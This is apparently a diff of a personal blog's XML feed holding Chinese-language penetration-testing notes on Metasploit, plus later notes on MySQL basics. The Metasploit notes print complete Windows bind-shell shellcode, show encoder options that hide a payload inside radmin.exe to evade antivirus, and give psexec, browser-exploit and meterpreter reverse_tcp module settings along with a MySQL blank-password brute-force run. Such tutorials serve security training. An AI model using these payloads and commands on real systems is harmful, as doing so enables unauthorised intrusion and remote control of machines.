         <content type="html"><![CDATA[<h4 id="生成payload"><a href="#生成payload" class="headerlink" title="生成payload"></a><strong>生成payload</strong></h4><pre><code>msfconsoleuse payload/windows/shell_bind_tcp        #选择使用payload模块generate            #生成默认输出ruby语言shellcodegenerate -f c        #生成C语言的shellcodegenerate -f python    #生成python语言shellcodegenerate -f jav        #生成java语言shellcodegenerate -f exe        #生成为EXE可执行文件generate -h</code></pre><ul><li><p>默认输出为ruby语言16进制shellcode</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># windows/shell_bind_tcp - 328 bytes</span></span><br><span class="line"><span class="comment"># https://metasploit.com/</span></span><br><span class="line"><span class="comment"># VERBOSE=false, LPORT=4444, RHOST=, PrependMigrate=false, </span></span><br><span class="line"><span class="comment"># EXITFUNC=process, CreateSession=true</span></span><br><span class="line">buf = </span><br><span class="line"><span class="string">"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50"</span> +</span><br><span class="line"><span class="string">"\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26"</span> +</span><br><span class="line"><span class="string">"\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7"</span> +</span><br><span class="line"><span class="string">"\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78"</span> +</span><br><span class="line"><span class="string">"\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3"</span> +</span><br><span class="line"><span class="string">"\x3a\x49\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01"</span> +</span><br><span class="line"><span class="string">"\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75\xe4\x58"</span> +</span><br><span class="line"><span class="string">"\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3"</span> +</span><br><span class="line"><span class="string">"\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a"</span> +</span><br><span class="line"><span class="string">"\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb\x8d\x5d\x68\x33\x32"</span> +</span><br><span class="line"><span class="string">"\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff"</span> +</span><br><span class="line"><span class="string">"\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b"</span> +</span><br><span class="line"><span class="string">"\x00\xff\xd5\x6a\x08\x59\x50\xe2\xfd\x40\x50\x40\x50\x68"</span> +</span><br><span class="line"><span class="string">"\xea\x0f\xdf\xe0\xff\xd5\x97\x68\x02\x00\x11\x5c\x89\xe6"</span> +</span><br><span class="line"><span class="string">"\x6a\x10\x56\x57\x68\xc2\xdb\x37\x67\xff\xd5\x57\x68\xb7"</span> +</span><br><span class="line"><span class="string">"\xe9\x38\xff\xff\xd5\x57\x68\x74\xec\x3b\xe1\xff\xd5\x57"</span> +</span><br><span class="line"><span class="string">"\x97\x68\x75\x6e\x4d\x61\xff\xd5\x68\x63\x6d\x64\x00\x89"</span> +</span><br><span class="line"><span class="string">"\xe3\x57\x57\x57\x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66\xc7"</span> +</span><br><span class="line"><span class="string">"\x44\x24\x3c\x01\x01\x8d\x44\x24\x10\xc6\x00\x44\x54\x50"</span> +</span><br><span class="line"><span class="string">"\x56\x56\x56\x46\x56\x4e\x56\x56\x53\x56\x68\x79\xcc\x3f"</span> +</span><br><span class="line"><span class="string">"\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30\x68\x08\x87\x1d"</span> +</span><br><span class="line"><span class="string">"\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff"</span> +</span><br><span class="line"><span class="string">"\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72"</span> +</span><br><span class="line"><span class="string">"\x6f\x6a\x00\x53\xff\xd5"</span></span><br></pre></td></tr></table></figure></li><li><p>MSF自动选择编码模块绕过坏字符</p></li></ul><pre><code>generate -b &apos;\x00&apos;generate -b &apos;\x00\x44\x67\x66\xfa\x01\xe0\x44\x67\xa1\xa2\xa3\x75\x4b&apos;generate -b &apos;\x00\x44\x67\x66\xfa\x01\xe0\x44\x67\xa1\xa2\xa3\x75\x4b\xFF\x0a\x0b\x01\xcc\6e\x1e\x2e\x26&apos;</code></pre><p><strong>直接使用payload</strong></p><ul><li>手动指定编码模块</li></ul><pre><code>show encoders        #显示可用编码模块generate -e x86/nonalpha    #-e参数指定编码模块generate -b &apos;\x00&apos; -f exe -e x86/shikata_ga_nai -i 5 -k -x /usr/share/windows-binaries/radmin.exe -o /root/1.exenc targetIP 4444</code></pre><p><strong>NOP</strong>: no-operation / Next Operation (无任何操作)</p><ul><li>EIP返回到存储NOP sled的任意地址时将递增,最终导致shellcode执行</li></ul><pre><code>generate -s 14</code></pre>]]></content>
       
@@ -364,9 +726,9 @@
             
             <tag> payload </tag>
             
-            <tag> ruby </tag>
-            
             <tag> shellcode </tag>
+            
+            <tag> ruby </tag>
             
         </tags>
       
@@ -376,8 +738,8 @@
     
     <entry>
       <title>MSF之Exploit模块</title>
-      <link href="/2016/03/04/MsF/MSF%E4%B9%8BExploit%E6%A8%A1%E5%9D%97/"/>
-      <url>/2016/03/04/MsF/MSF%E4%B9%8BExploit%E6%A8%A1%E5%9D%97/</url>
+      <link href="/2016/03/04/Exploits/MsF/MSF%E4%B9%8BExploit%E6%A8%A1%E5%9D%97/"/>
+      <url>/2016/03/04/Exploits/MsF/MSF%E4%B9%8BExploit%E6%A8%A1%E5%9D%97/</url>
       
         <content type="html"><![CDATA[<h4 id="Exploit模块"><a href="#Exploit模块" class="headerlink" title="Exploit模块"></a><strong>Exploit模块</strong></h4><p><strong>Active Exploit</strong>    主动利用</p><pre><code>#smb漏洞,直接利用达到控制目标,类似永恒之蓝use exploit/windows/smb/psexec            set rhost 192.168.254.113set payload windows/shell/reverse_tcpset lhost 192.168.254.118set lport 4444set SMBUSER user1set SMBPASS pass1exploit</code></pre><p><strong>Passive Exploits</strong>    被动利用</p><pre><code>#针对早期IE6,IE7浏览器漏洞,诱使目标访问URL即可控制目标use exploit/windows/browser/ms07_017_ani_loadimage_chunksize    set URIPATH /set PAYLOAD windows/shell/reverse_tcpset LHOST 192.168.254.111set LPORT 4444exploit</code></pre>]]></content>
       
@@ -409,10 +771,10 @@
     
     <entry>
       <title>MSF基本使用和控制台命令</title>
-      <link href="/2016/03/04/MsF/MSF%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8%E5%92%8C%E6%8E%A7%E5%88%B6%E5%8F%B0%E5%91%BD%E4%BB%A4/"/>
-      <url>/2016/03/04/MsF/MSF%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8%E5%92%8C%E6%8E%A7%E5%88%B6%E5%8F%B0%E5%91%BD%E4%BB%A4/</url>
+      <link href="/2016/03/04/Exploits/MsF/MSF%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8%E5%92%8C%E6%8E%A7%E5%88%B6%E5%8F%B0%E5%91%BD%E4%BB%A4/"/>
+      <url>/2016/03/04/Exploits/MsF/MSF%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8%E5%92%8C%E6%8E%A7%E5%88%B6%E5%8F%B0%E5%91%BD%E4%BB%A4/</url>
       
-        <content type="html"><![CDATA[<blockquote><h4 id="MSF基本使用"><a href="#MSF基本使用" class="headerlink" title="MSF基本使用"></a>MSF基本使用</h4></blockquote><ul><li><p>使用前先升级: <code>msfupdate</code></p></li><li><p>msfcli 使用接口</p></li><li><p>msfconsole 使用接口<br>  最流行的用户接口<br>  几乎可以使用全部的MSF功能<br>  控制台命令支持TAB自动补齐<br>  支持外部命令的执行(系统命令等)<br>  点击鼠标启动 <code>/ msfconsole -h -q -r -v / exit</code><br>  <code>help / ? / workspace</code></p></li><li><p><code>banner , color , connect -h</code>        </p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">connect 1.1.1.1 80#connect类似nc</span><br></pre></td></tr></table></figure><h4 id="msfconsole-控制台命令"><a href="#msfconsole-控制台命令" class="headerlink" title="msfconsole 控制台命令"></a>msfconsole 控制台命令</h4><p><strong>show</strong>    #使用频率高</p><pre><code>show all            #显示所有模块show exploits        #显示可利用模块show payloads        #显示可用payload模块show auxiliary        #显示可用辅助模块    show options        #显示选项show encoders        #显示可用编码模块show nops            #显示nops模块show plugins        #显示可用插件</code></pre><p><strong>search</strong>        搜索命令</p><pre><code>search -hsearch ms10-046            #根据关键字搜索search ms08-067search usermap_scriptsearch name:mysql        #搜索名称包含search platform:aix        #根据平台搜索search type:aux            #根据类型搜索search author:aaron        #根据作者名搜索search cve:2011            #根据cve时间搜索                        #可多条件同时搜索</code></pre><p><strong>use</strong>    使用</p><pre><code>use exploit/windows/smb/ms08_067_netapi            #search找到目标模块后use它use auxiliary/dos/windows/smb/ms09_001_write    info            #查看当前模块信息    info edit        #编辑模块信息    show options    #显示当前模块配置选项    show targets    #显示当前模块适用攻击目标    show payload    #显示当前模块适用的payload    show advanced    #显示当前模块高级参数    show missing    #显示当前模块未配置参数    show evasion    #逃避    set rhost 1.1.1.1    #设置当前模块目标IP    chack                #检查配置    back                #返回上一级命令</code></pre><p><strong>msf数据库相关命令</strong></p><pre><code>db_status            #查看数据库状态db_rebuild_cache    #创建数据库缓存,MSF5不推荐使用此命令db_disconnect        #断开数据连接db_connect -h        #连接其它数据库    /usr/share/metasploit-framework/config/database.yml    #指定数据库连接配置文件进行连接db_nmap 1.1.1.1                    #使用nmap扫描并将扫描结果储存到msf数据库    hosts                        #扫描后,hosts查看所有目标机器信息    hosts 192.168.254.254        #指定目标IP查看    hosts -u                    #只看up开机状态的机器    hosts -c address,os_name    #筛选只看IP和系统类型    hosts -S windows            #搜索指定信息查看    services -h                    #和hosts命令类似    services -p 80                #只看开放80端口的机器    services -p 1-200            #指定端口范围查看    services -c port,info,name     #筛选信息查看db_import                        #导入数据    #结合nmap扫描并输出结果为xml    nmap -A 192.168.254.113 -oX namp.xml        db_import /root/nmap.xml    #导入nmap扫描结果db_export -h                        db_export -f xml /root/bak.xml    #导出备份数据</code></pre><p><strong>set</strong> 设置</p><pre><code>set        #设置unset    #取消设置setg    #全局变量设置unsetg    #取消全局变量设置save    #保存配置,下次启动MSF不用重新设置</code></pre><p><strong>执行</strong></p><pre><code>runexploitexploit -j    #后台执行jobs            #查看已执行的任务sessions -l        #查看已建立连接的会话sessions -i 1    #进入已建立连接的会话load            #加载插件load openvas    #加载openvasunload            #取消加载的插件loadpath        #加载路径自定义插件route            #通过指定sessions路由流量route add 10.1.1.0 255.255.255.0 1irb                #开发接口    Framework::Version    puts &apos;hello world&apos;resource r.rc        #调用资源文件msfconsol -r r.rc    #调用资源文件</code></pre><p><strong>msf爆破mysql空密码测试</strong></p><pre><code>msfconsolesearch mysql_loginuse auxiliary/scanner/mysql/mysql_loginshow optionsset USERNAME rootset BLANK_PASSWORDS trueset rhost 192.168.254.113exploit -jcreds        #查看扫描出的密码信息vulns        #查看目标漏洞信息loot        #查看获取的hashdump</code></pre><h4 id="Msfcli"><a href="#Msfcli" class="headerlink" title="Msfcli"></a><strong>Msfcli</strong></h4><ul><li>2015年6月已经被取消</li><li>由msfconsole -x 取代</li><li>编写脚本时便于引用</li></ul><p>msfconsole -x “use exploit/windows/smb/ms08_067_netapi; set RHOST 1.1.1.1; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 1.1.1.8; set LPORT 5555; set target 34; exploit”</p>]]></content>
+        <content type="html"><![CDATA[<blockquote><h4 id="MSF基本使用"><a href="#MSF基本使用" class="headerlink" title="MSF基本使用"></a>MSF基本使用</h4></blockquote><ul><li><p>使用前先升级: <code>msfupdate</code></p></li><li><p>msfcli 使用接口</p></li><li><p>msfconsole 使用接口<br>  最流行的用户接口<br>  几乎可以使用全部的MSF功能<br>  控制台命令支持TAB自动补齐<br>  支持外部命令的执行(系统命令等)<br>  点击鼠标启动 <code>/ msfconsole -h -q -r -v / exit</code><br>  <code>help / ? / workspace</code></p></li><li><p><code>banner , color , connect -h</code>        </p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">connect 1.1.1.1 80#connect类似nc</span><br></pre></td></tr></table></figure><h4 id="msfconsole-控制台命令"><a href="#msfconsole-控制台命令" class="headerlink" title="msfconsole 控制台命令"></a>msfconsole 控制台命令</h4><p><strong>show</strong>    #使用频率高</p><pre><code>show all            #显示所有模块show exploits        #显示可利用模块show payloads        #显示可用payload模块show auxiliary        #显示可用辅助模块    show options        #显示选项show encoders        #显示可用编码模块show nops            #显示nops模块show plugins        #显示可用插件</code></pre><p><strong>search</strong>        搜索命令</p><pre><code>search -hsearch ms10-046            #根据关键字搜索search ms08-067search usermap_scriptsearch name:mysql        #搜索名称包含search platform:aix        #根据平台搜索search type:aux            #根据类型搜索search author:aaron        #根据作者名搜索search cve:2011            #根据cve时间搜索                        #可多条件同时搜索</code></pre><p><strong>use</strong>    使用</p><pre><code>use exploit/windows/smb/ms08_067_netapi            #search找到目标模块后use它use auxiliary/dos/windows/smb/ms09_001_write    info            #查看当前模块信息    info edit        #编辑模块信息    show options    #显示当前模块配置选项    show targets    #显示当前模块适用攻击目标    show payload    #显示当前模块适用的payload    show advanced    #显示当前模块高级参数    show missing    #显示当前模块未配置参数    show evasion    #逃避    set rhost 1.1.1.1    #设置当前模块目标IP    chack                #检查配置    back                #返回上一级命令</code></pre><p><strong>msf数据库相关命令</strong></p><pre><code>service postgresql start    #启动postgresql数据库msfdb init        #初始化msf数据库msfdb reinit    #重新初始化msfdb start        #启动msfdb stop        #停止msfdb delete    #删除数据库msfdb status    #查看服务状态msfdb run        #启动数据库并启动msfconsoledb_status            #查看数据库状态db_rebuild_cache    #创建数据库缓存,MSF5不推荐使用此命令db_disconnect        #断开数据连接db_connect -h        #连接其它数据库    /usr/share/metasploit-framework/config/database.yml    #指定数据库连接配置文件进行连接db_nmap 1.1.1.1                    #使用nmap扫描并将扫描结果储存到msf数据库    hosts                        #扫描后,hosts查看所有目标机器信息    hosts 192.168.254.254        #指定目标IP查看    hosts -u                    #只看up开机状态的机器    hosts -c address,os_name    #筛选只看IP和系统类型    hosts -S windows            #搜索指定信息查看    services -h                    #和hosts命令类似    services -p 80                #只看开放80端口的机器    services -p 1-200            #指定端口范围查看    services -c port,info,name     #筛选信息查看db_import                        #导入数据    #结合nmap扫描并输出结果为xml    nmap -A 192.168.254.113 -oX namp.xml        db_import /root/nmap.xml    #导入nmap扫描结果db_export -h                        db_export -f xml /root/bak.xml    #导出备份数据</code></pre><p><strong>set</strong> 设置</p><pre><code>set        #设置unset    #取消设置setg    #全局变量设置unsetg    #取消全局变量设置save    #保存配置,下次启动MSF不用重新设置</code></pre><p><strong>执行</strong></p><pre><code>runexploitexploit -j    #后台执行jobs            #查看已执行的任务sessions -l        #查看已建立连接的会话sessions -i 1    #进入已建立连接的会话load            #加载插件load openvas    #加载openvasunload            #取消加载的插件loadpath        #加载路径自定义插件route            #通过指定sessions路由流量route add 10.1.1.0 255.255.255.0 1irb                #开发接口    Framework::Version    puts &apos;hello world&apos;resource r.rc        #调用资源文件msfconsol -r r.rc    #调用资源文件</code></pre><p><strong>msf爆破mysql空密码测试</strong></p><pre><code>msfconsolesearch mysql_loginuse auxiliary/scanner/mysql/mysql_loginshow optionsset USERNAME rootset BLANK_PASSWORDS trueset rhost 192.168.254.113exploit -jcreds        #查看扫描出的密码信息vulns        #查看目标漏洞信息loot        #查看获取的hashdump</code></pre><h4 id="Msfcli"><a href="#Msfcli" class="headerlink" title="Msfcli"></a><strong>Msfcli</strong></h4><ul><li>2015年6月已经被取消</li><li>由msfconsole -x 取代</li><li>编写脚本时便于引用</li></ul><p>msfconsole -x “use exploit/windows/smb/ms08_067_netapi; set RHOST 1.1.1.1; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 1.1.1.8; set LPORT 5555; set target 34; exploit”</p>]]></content>
       
       
       <categories>
@@ -432,9 +794,9 @@
             
             <tag> nmap </tag>
             
-            <tag> Metasploit </tag>
-            
             <tag> Kali </tag>
+            
+            <tag> Metasploit </tag>
             
             <tag> msfconsole </tag>
             
@@ -446,8 +808,8 @@
     
     <entry>
       <title>MSF架构和技术功能模块</title>
-      <link href="/2016/03/04/MsF/MSF%E6%9E%B6%E6%9E%84%E5%92%8C%E6%8A%80%E6%9C%AF%E5%8A%9F%E8%83%BD%E6%A8%A1%E5%9D%97/"/>
-      <url>/2016/03/04/MsF/MSF%E6%9E%B6%E6%9E%84%E5%92%8C%E6%8A%80%E6%9C%AF%E5%8A%9F%E8%83%BD%E6%A8%A1%E5%9D%97/</url>
+      <link href="/2016/03/04/Exploits/MsF/MSF%E6%9E%B6%E6%9E%84%E5%92%8C%E6%8A%80%E6%9C%AF%E5%8A%9F%E8%83%BD%E6%A8%A1%E5%9D%97/"/>
+      <url>/2016/03/04/Exploits/MsF/MSF%E6%9E%B6%E6%9E%84%E5%92%8C%E6%8A%80%E6%9C%AF%E5%8A%9F%E8%83%BD%E6%A8%A1%E5%9D%97/</url>
       
         <content type="html"><![CDATA[<h4 id="MSF架构"><a href="#MSF架构" class="headerlink" title="MSF架构"></a><strong>MSF架构</strong></h4><p><img src="https://github.com/iseanhe/iseanhe.github.io/raw/master/img/mdphotos/msf.png" alt="MSF架构"></p><p><strong>Rex</strong></p><ul><li>基本功能库,用于完成日常基本任务,无需人工手动编码实现</li><li>处理socket连接访问,协议应答(http/SSL/SMB等)</li><li>编码转换(XOR,Base64,Unicode)</li></ul><p><strong>MsF::Core</strong></p><ul><li>提供MsF的核心基本API,是框架的核心能力实现库</li></ul><p><strong>MsF::Base</strong></p><ul><li>提供友好的API接口,便于模块调用的库</li></ul><p><strong>Plugin 插件</strong></p><ul><li>连接和调用外部扩展功能和系统</li></ul><h4 id="MSF目录结构"><a href="#MSF目录结构" class="headerlink" title="MSF目录结构"></a><strong>MSF目录结构</strong></h4><pre><code>cd /usr/share/metasploit-framework/ &amp;&amp; lsls modules    #模块目录</code></pre><p><strong>技术功能模块</strong>    (不是流程模块)</p><ul><li><p>Exploits: 利用系统漏洞进行攻击的动作,此模块对应每一个具体漏洞的攻击方法(主动,被动)</p></li><li><p>Payload: 成功exploit之后,真正在目标系统执行的代码或指令<br>  shellcode或系统命令<br>  三种payload: <code>cd /usr/share/metasploit-framework/modules/payloads/ &amp;&amp; ls</code></p><p>  Single: all-in-one<br>  Stager: 目标计算机内存有限时,先传输一个较小的payload用于建立连接<br>  Stages: 利用stager建立的连接下载的后续payload<br>  Stager,stages都有多种类型,适用于不同场景<br>  Shellcode 是payload的一种,由于其建立正向/反向shell而得名</p></li><li><p>Auxiliary: 执行信息收集,枚举,指纹探测,扫描等功能的辅助模块(没有payload的exploit模块)</p></li><li><p>Encoders: 对payload进行加密,躲避AV检查的模块</p></li><li><p>Nops: 提高payload稳定性及维持大小</p></li></ul>]]></content>
       
@@ -469,9 +831,9 @@
             
             <tag> payload </tag>
             
-            <tag> exploit </tag>
-            
             <tag> shellcode </tag>
+            
+            <tag> exploit </tag>
             
         </tags>
       
@@ -481,8 +843,8 @@
     
     <entry>
       <title>Metasploit简介及版本</title>
-      <link href="/2016/03/03/MsF/Metasploit%E7%AE%80%E4%BB%8B%E5%8F%8A%E7%89%88%E6%9C%AC/"/>
-      <url>/2016/03/03/MsF/Metasploit%E7%AE%80%E4%BB%8B%E5%8F%8A%E7%89%88%E6%9C%AC/</url>
+      <link href="/2016/03/03/Exploits/MsF/Metasploit%E7%AE%80%E4%BB%8B%E5%8F%8A%E7%89%88%E6%9C%AC/"/>
+      <url>/2016/03/03/Exploits/MsF/Metasploit%E7%AE%80%E4%BB%8B%E5%8F%8A%E7%89%88%E6%9C%AC/</url>
       
         <content type="html"><![CDATA[<blockquote><h4 id="渗透测试者的困扰"><a href="#渗透测试者的困扰" class="headerlink" title="渗透测试者的困扰"></a><strong>渗透测试者的困扰</strong></h4></blockquote><ul><li>需要掌握数百个工具软件,上千个命令参数,实在记不住</li><li>新出现的漏洞PoC/EXP有不同的运行环境要求,准备工作繁琐</li><li>大部分时间都在学习不同工具的使用习惯,如果能统一就好了</li><li>Metasploit 能解决以上困扰吗?</li></ul><h4 id="Metasploit简介"><a href="#Metasploit简介" class="headerlink" title="Metasploit简介"></a><strong>Metasploit简介</strong></h4><ul><li><p>目前最流行,最强大,最具扩展性的渗透测试平台软件</p></li><li><p>基于Metasploit惊醒渗透测试和漏洞分析的流程和方法</p></li><li><p>2003年由HD Moore发布第一版,2007年用ruby语言重写<br>  框架集成了渗透测试标准(PETS)思想<br>  一定程度上统一了渗透测试和漏洞研究的工作环境<br>  新的攻击代码可以比较容易的加入框架</p></li><li><p>开发活跃版本更新频繁(每周)<br>  早期版本基于社区力量维护,被Rapid 7收购后打造出其商业版产品<br>  目前分化为四个版本,社区版依然十分活跃<br>  HD More说: 为Metasploit写书是种自虐!<br>  2014年之后市场上没有再出现新的Metasploit教材</p></li><li><p>Offensive security 出版的Metasploit教材</p></li><li><p>被HD Moore称之为当时最好的Metasploit教材(2011/2012)</p></li></ul><h4 id="版本对比"><a href="#版本对比" class="headerlink" title="版本对比"></a><strong>版本对比</strong></h4><table><thead><tr><th align="center">Feature</th><th align="center">Metasploit Framework</th><th align="center">Metasploit Community</th><th align="center">Metasploit Express</th><th align="center">Metasploit Pro</th></tr></thead><tbody><tr><td align="center">License</td><td align="center">Free</td><td align="center">Free</td><td align="center">$5,000</td><td align="center">授权</td></tr><tr><td align="center">Web APP测试</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center">Y</td></tr><tr><td align="center">Report</td><td align="center"></td><td align="center"></td><td align="center">Y</td><td align="center">Y</td></tr><tr><td align="center">AV免杀</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center">Y</td></tr><tr><td align="center">操作界面</td><td align="center">Command-line</td><td align="center">Web</td><td align="center">Web</td><td align="center">Web/cmd/adv cmd</td></tr><tr><td align="center">IDS/IPS绕过</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center">Y</td></tr><tr><td align="center">社区支持</td><td align="center">Y</td><td align="center">Y</td><td align="center">Y</td><td align="center">Y</td></tr><tr><td align="center">Rapid7支持</td><td align="center"></td><td align="center"></td><td align="center">Y</td><td align="center">Y</td></tr><tr><td align="center">团队协作</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center">Y</td></tr><tr><td align="center">VPN Pivoting</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center">Y</td></tr></tbody></table><h4 id="Metasploit-Framework"><a href="#Metasploit-Framework" class="headerlink" title="Metasploit Framework"></a><strong>Metasploit Framework</strong></h4><ul><li>MSF 默认集成于Kali Linux中</li><li>使用postgresql数据库存储数据<br>  早期版本需要先启动数据库再启动msf</li></ul><pre><code>msfdb init        #初始化msf数据库msfdb reinit    #重新初始化msfdb start        #启动msfdb stop        #停止msfdb delete    #删除数据库msfdb status    #查看服务状态msfdb run        #启动数据库并启动msfconsole</code></pre>]]></content>
       
@@ -502,9 +864,9 @@
             
             <tag> MSF </tag>
             
-            <tag> Metasploit </tag>
-            
             <tag> Kali </tag>
+            
+            <tag> Metasploit </tag>
             
             <tag> ruby </tag>
             
@@ -729,8 +1091,6 @@
       
         <tags>
             
-            <tag> Kali </tag>
-            
             <tag> dns2tcp </tag>
             
             <tag> squid3 </tag>
@@ -742,6 +1102,8 @@
             <tag> 隧道嵌套 </tag>
             
             <tag> Bodhi </tag>
+            
+            <tag> Kali </tag>
             
         </tags>
       
@@ -772,9 +1134,9 @@
             
             <tag> 端口转发 </tag>
             
-            <tag> VNC </tag>
-            
             <tag> SSH </tag>
+            
+            <tag> VNC </tag>
             
             <tag> proxychains </tag>
             
@@ -807,9 +1169,9 @@
             
             <tag> 端口转发 </tag>
             
-            <tag> SSH </tag>
-            
             <tag> shell </tag>
+            
+            <tag> SSH </tag>
             
             <tag> 隧道 </tag>
             
@@ -945,11 +1307,11 @@
             
             <tag> arpspoof </tag>
             
-            <tag> dnsspoof </tag>
-            
             <tag> Ettercap </tag>
             
             <tag> PTH </tag>
+            
+            <tag> dnsspoof </tag>
             
             <tag> 中间人攻击 </tag>
             
@@ -982,11 +1344,11 @@
             
             <tag> arpspoof </tag>
             
+            <tag> dnsspoof </tag>
+            
             <tag> driftnet </tag>
             
             <tag> dsniff </tag>
-            
-            <tag> dnsspoof </tag>
             
         </tags>
       
@@ -1015,13 +1377,13 @@
       
         <tags>
             
+            <tag> 离线密码破解 </tag>
+            
             <tag> John </tag>
             
             <tag> 彩虹表 </tag>
             
             <tag> Ophcrack </tag>
-            
-            <tag> 离线密码破解 </tag>
             
             <tag> Linux密码破解 </tag>
             
@@ -1060,13 +1422,13 @@
             
             <tag> nc </tag>
             
-            <tag> 离线密码破解 </tag>
-            
             <tag> hashid </tag>
             
             <tag> hash‐identifier </tag>
             
             <tag> hashcat </tag>
+            
+            <tag> 离线密码破解 </tag>
             
         </tags>
       
@@ -1095,9 +1457,9 @@
       
         <tags>
             
-            <tag> 彩虹表 </tag>
-            
             <tag> hashcat </tag>
+            
+            <tag> 彩虹表 </tag>
             
             <tag> GPU </tag>
             
@@ -1395,6 +1757,64 @@
     
     
     <entry>
+      <title>MySQL数据类型</title>
+      <link href="/2014/05/05/MySQL/MySQL%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/"/>
+      <url>/2014/05/05/MySQL/MySQL%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/</url>
+      
+        <content type="html"><![CDATA[<blockquote><h4 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a><strong>数据类型</strong></h4></blockquote><ol><li><p><strong>数值类型</strong> (有符号signed和无符号unsigned)</p><ul><li><p>整型</p><ul><li><p>int 大整型(4个字节)<br>  取值范围: <code>0 - 2 ** 32 -1</code> (约42亿+)</p></li><li><p>tinyint 微小整型(1个字节) </p><ul><li>有符号(signed默认): -128-127</li><li>无符号(unsigned):0-255</li></ul></li><li><p>smallint 小整型(2个字节)<br>  取值范围: 0 -65535</p></li><li><p>bigint 极大整型(8个字节)<br>  取值范围: <code>0 - 2 ** 64 - 1</code></p></li></ul></li><li><p>浮点型</p><ul><li>float (4个字节,最多显示7个有效位)<br>  <strong>用法</strong>:<br>  字段名 float(m,n) m:表示总位数 n:小数位位数<br>  salary float(5,2) 取值范围? -999.99 ~ 999.99</li></ul></li></ul></li></ol><ol start="2"><li><strong>字符类型</strong></li><li>枚举类型</li><li>日期时间类型</li></ol>]]></content>
+      
+      
+      <categories>
+          
+          <category> DBMS </category>
+          
+          <category> MySQL </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 数据类型 </tag>
+            
+            <tag> mysql </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>MySQL介绍及基本使用</title>
+      <link href="/2014/05/04/MySQL/MySQL%E4%BB%8B%E7%BB%8D%E5%8F%8A%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/"/>
+      <url>/2014/05/04/MySQL/MySQL%E4%BB%8B%E7%BB%8D%E5%8F%8A%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/</url>
+      
+        <content type="html"><![CDATA[<h4 id="名词介绍"><a href="#名词介绍" class="headerlink" title="名词介绍"></a><strong>名词介绍</strong></h4><ul><li>DB(Database)<br>DB就是数据库,存储数据的仓库</li><li>DBMS(Database Management System)<br>数据库管理系统<br>管理数据库的软件:MySQL,Oracle,MongoDB…</li><li>DBS(Database System)<br>数据库系统<br>DBS = DB(存储) + DBMS(数据库管理软件) + 数据库应用(财务管理系统,人事管理系统) + 用户</li></ul><h4 id="MySQL的特点"><a href="#MySQL的特点" class="headerlink" title="MySQL的特点"></a><strong>MySQL的特点</strong></h4><blockquote><p><strong>关系型数据库</strong></p></blockquote><ol><li>关系型数据库的特点</li></ol><ul><li>数据是以行和列的形式去存储的</li><li>这一系列的行和列称为表</li><li>表中的每一行叫一条纪录</li><li>表中的每一列叫一个字段</li><li>表和表之间的逻辑关联叫关系</li></ul><p><strong>Example:</strong></p><ol><li><p>关系型数据库存储<br> 学生信息表:<br> 姓名    年龄    班级<br> cat        22        AID1803<br> owl        23        AID1801<br> 班级信息表:<br> 班级    班主任<br> AID1803        小可爱<br> AID1801        大可爱</p></li><li><p>非关系型数据库中存储<br> {“姓名”:”cat”,”年龄”:22,”班级”:”AID1803”,”班主任”:”小可爱”}<br> 